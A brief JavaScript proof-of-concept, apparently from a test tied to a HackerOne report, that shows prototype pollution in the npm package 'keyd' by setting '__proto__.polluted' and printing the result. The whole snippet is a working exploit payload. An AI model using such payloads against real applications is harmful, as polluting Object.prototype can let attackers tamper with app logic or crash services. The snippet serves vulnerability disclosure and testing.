// //https://hackerone.com/reports/877515
// test("prototype pollution in keyd", () => {
console.log({}.polluted);

  const keyd = require("keyd");
  keyd({}).set("__proto__.polluted", "yes"); //payload

console.log({}.polluted);
// });
